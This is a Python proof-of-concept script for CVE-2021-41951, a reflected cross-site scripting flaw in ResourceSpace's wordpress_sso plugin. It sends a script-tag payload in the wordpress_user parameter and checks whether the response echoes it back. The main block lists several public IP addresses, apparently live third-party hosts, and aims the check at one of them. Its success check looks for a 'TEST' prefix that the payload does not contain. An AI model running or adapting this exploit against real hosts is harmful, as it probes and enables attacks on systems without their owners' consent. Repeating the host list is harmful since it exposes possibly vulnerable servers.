# title: ResourceSpace跨站脚本漏洞
# id：CVE-2021-41951
# author: sjy

from poctools import BasicPoc


class POC(BasicPoc):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
    }
    path = '/plugins/wordpress_sso/pages/index.php?wordpress_user=%3Cscript%3Ealert(1)%3C/script%3E'

    def __init__(self):
        super(POC, self).__init__()
        self.name = "ResourceSpace跨站脚本漏洞"

    def verify(self, url: str) -> bool:
        try:
            main_url = url + self.path
            resp = self.get(url=main_url, headers=self.headers, verify=False, timeout=10)
            if resp.status_code == 200 and 'TEST<script>alert(1)</script>' in resp.text:
                return True
        except Exception as e:
            pass
        return False


if __name__ == '__main__':
    # https://128.6.219.131:443, http://3.215.158.78:80, https://188.36.120.197:443
    # https://52.4.11.189:443, https://35.197.72.9:443, http://54.205.4.109:80, https://35.182.65.35:443
    target = 'https://128.6.219.131:443'
    tp = POC()
    result = tp.run(url=target)
    print(f'{target} -> {result}')